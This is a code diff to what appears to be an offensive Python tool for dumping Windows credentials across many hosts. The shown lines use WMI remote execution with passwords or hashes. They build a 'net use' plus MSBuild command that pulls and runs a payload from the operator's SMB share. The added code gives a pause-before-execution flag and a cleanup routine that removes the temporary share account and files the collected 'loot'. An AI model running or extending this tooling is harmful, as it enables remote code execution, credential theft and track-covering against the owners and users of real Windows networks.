@@ -738,6 +738,47 @@ def setup_share():
 
     return share_name, share_user, share_pass, payload_name, share_group
 
+def alt_exec():
+
+    yes = input('Press enter to  ')
+    print("\n{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))
+
+    if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
+        os.system('sudo rm {}/drives.txt'.format(cwd))
+
+    try:
+        os.system("sudo systemctl stop smbd")
+    except BaseException as e:
+        pass
+
+    try:
+        os.system("sudo cp " + cwd + "/smb.conf /etc/samba/smb.conf")
+    except BaseException as e:
+        pass
+
+    try:
+        os.system("sudo rm " + cwd + "/smb.conf")
+    except BaseException as e:
+        pass
+
+    try:
+        os.system("sudo userdel " + share_user)
+    except BaseException as e:
+        pass
+
+    try:
+        os.system("sudo groupdel " + share_group)
+    except BaseException as e:
+        pass
+
+    try:
+        os.system("sudo mv /var/tmp/{} {}/loot/'{}'".format(share_name, cwd, timestamp))
+    except BaseException as e:
+        pass
+    print("{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(color_BLU,
+                                                                                                         color_reset))
+    exit(0)
+
 def exec_netuse(ip, domain):
     try:
         executer = WMIEXEC('net use', username, password, domain, options.hashes, options.aesKey, options.share, False,
@@ -913,6 +954,7 @@ if __name__ == '__main__':
     parser.add_argument('-share', action='store', default='ADMIN$', help='share where the output will be grabbed from (default ADMIN$) (wmiexec ONLY)')
     parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
+    parser.add_argument('-oe', action='store_true', default = False, help='Pause just before the execution of the payload (Good for when you want to execute the payload using other methods)')
     parser.add_argument('-ap', action='store_true', default = False, help='Turn auto parsing of .dmp files ON this will parse the .dmp files into dumped_full.txt, dumped_full_grep.grep, and dumped_msv.txt')
     parser.add_argument('-drive', action='store', help='Set the drive letter for the remote device to connect with')
     parser.add_argument('-threads', action='store', type = int, default = 5,help='Set the maximum number of threads default=5')
@@ -1060,6 +1102,9 @@ if __name__ == '__main__':
         command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
         print(command)
         print("")
+        
+        if options.oe:
+            alt_exec()
 
         with open('{}/log.txt'.format(cwd), 'a') as f:
             f.write('Total targets: {}\n'.format(len(addresses)))
